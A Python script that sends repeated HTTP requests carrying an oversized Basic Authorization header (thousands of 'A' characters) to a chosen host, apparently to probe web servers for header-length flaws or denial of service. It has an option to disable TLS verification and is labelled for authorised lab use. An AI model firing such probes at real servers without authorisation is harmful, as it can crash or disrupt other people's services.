import socket
import ssl
import base64
import argparse
import time
import sys
from urllib.parse import urlparse

def build_auth_request(host, path="/", payload_len=10000):
    payload = "A" * int(payload_len)
    credentials = f"test:{payload}"
    encoded_credentials = base64.b64encode(credentials.encode()).decode()

    req_lines = [
        f"GET {path} HTTP/1.1",
        f"Host: {host}",
        f"Authorization: Basic {encoded_credentials}",
        "Connection: close",
        "",
        ""
    ]
    return "\r\n".join(req_lines).encode("utf-8")

def send_once(host, port, use_tls, request_bytes, timeout):
    sock = None
    try:
        sock = socket.create_connection((host, port), timeout=timeout)
        if use_tls:
            context = ssl.create_default_context()
            # For lab testing with self-signed certs you might disable verification (NOT recommended)
            # context.check_hostname = False
            # context.verify_mode = ssl.CERT_NONE
            sock = context.wrap_socket(sock, server_hostname=host)
        sock.sendall(request_bytes)

        resp = bytearray()
        while True:
            chunk = sock.recv(4096)
            if not chunk:
                break
            resp.extend(chunk)
        return bytes(resp)
    finally:
        if sock:
            try:
                sock.close()
            except Exception:
                pass

def summarize_response(resp_bytes):
    if not resp_bytes:
        return "No response"
    try:
        text = resp_bytes.decode("utf-8", errors="replace")
    except Exception:
        text = str(resp_bytes)
    # split headers/body
    parts = text.split("\r\n\r\n", 1)
    headers = parts[0] if parts else text
    first_line = headers.splitlines()[0] if headers else ""
    body_len = len(parts[1]) if len(parts) > 1 else 0
    return f"{first_line} | body_len={body_len} | raw_len={len(resp_bytes)}"

def parse_target(target):
    p = urlparse(target if "://" in target else f"http://{target}")
    host = p.hostname
    port = p.port
    scheme = p.scheme
    path = p.path or "/"
    if p.query:
        path += "?" + p.query
    use_tls = scheme.lower() == "https"
    if port is None:
        port = 443 if use_tls else 80
    return host, port, path, use_tls

def main():
    parser = argparse.ArgumentParser(description="Send repeated GET requests with a long Authorization header (lab use only).")
    parser.add_argument("target", help="Target URL or host (e.g. http://127.0.0.1:8080/ or example.com:80 or example.com)")
    parser.add_argument("--count", type=int, default=5, help="Number of requests to send (default: 5)")
    parser.add_argument("--delay", type=float, default=1.0, help="Delay between requests in seconds (default: 1.0)")
    parser.add_argument("--payload-len", type=int, default=10000, help="Length of payload to include after 'test:' (default: 10000)")
    parser.add_argument("--timeout", type=float, default=5.0, help="Socket connect/read timeout seconds (default: 5.0)")
    parser.add_argument("--insecure-tls", action="store_true", help="(Lab only) disable TLS cert verification")
    args = parser.parse_args()

    host, port, path, use_tls = parse_target(args.target)
    if host is None:
        print("Could not parse target host. Provide a valid hostname or URL.")
        sys.exit(1)

    # If user wants insecure TLS, adjust context in send_once (not ideal to toggle global here).
    if args.insecure_tls and not use_tls:
        print("Warning: --insecure-tls specified but target is not https. Ignoring.")

    print(f"Target: {host}:{port}{path} (tls={use_tls})")
    print(f"Requests: {args.count}, payload_len={args.payload_len}, delay={args.delay}s, timeout={args.timeout}s")
    print("Warning: Use only in authorized testing environments.\n")

    request_bytes = build_auth_request(host, path, args.payload_len)

    for i in range(1, args.count + 1):
        print(f"[{i}/{args.count}] Connecting to {host}:{port} ...", end=" ")
        try:
            # If insecure-tls is requested and use_tls true, create a context that doesn't verify.
            if args.insecure_tls and use_tls:
                # create a custom send_once with disabled verification
                sock = socket.create_connection((host, port), timeout=args.timeout)
                context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                sock = context.wrap_socket(sock, server_hostname=host)
                sock.sendall(request_bytes)
                resp = bytearray()
                while True:
                    chunk = sock.recv(4096)
                    if not chunk:
                        break
                    resp.extend(chunk)
                # close socket
                try:
                    sock.close()
                except Exception:
                    pass
                resp_bytes = bytes(resp)
            else:
                resp_bytes = send_once(host, port, use_tls, request_bytes, args.timeout)

            summary = summarize_response(resp_bytes)
            print("OK")
            print("  ->", summary)
        except Exception as e:
            print("ERROR")
            print("  ->", e)

        if i != args.count:
            time.sleep(args.delay)

if __name__ == "__main__":
    main()
